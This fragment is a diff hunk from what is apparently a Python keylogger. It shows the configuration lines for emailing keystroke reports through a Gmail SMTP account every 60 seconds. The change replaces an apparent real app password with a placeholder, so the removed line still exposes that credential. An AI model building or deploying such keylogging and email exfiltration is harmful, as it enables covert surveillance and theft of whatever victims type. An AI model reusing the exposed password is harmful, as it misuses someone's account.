@@ -6,7 +6,7 @@ from threading import Timer # For sending keylog report once every [] seconds
 from datetime import datetime
 
 SMTP_ADDRESS = "inquire.blairandrews@gmail.com"
-SMTP_PASSWORD = "aeposzwiycjkaxzm" # Gmail program authentication password
+SMTP_PASSWORD = "INSERT PASSWORD HERE" # Gmail program authentication password
 REPORT_INTERVAL = 60 # Sends report every <> second(s)
 VERBOSITY = 1 # Set to 0 (False) or 1 (True)
 
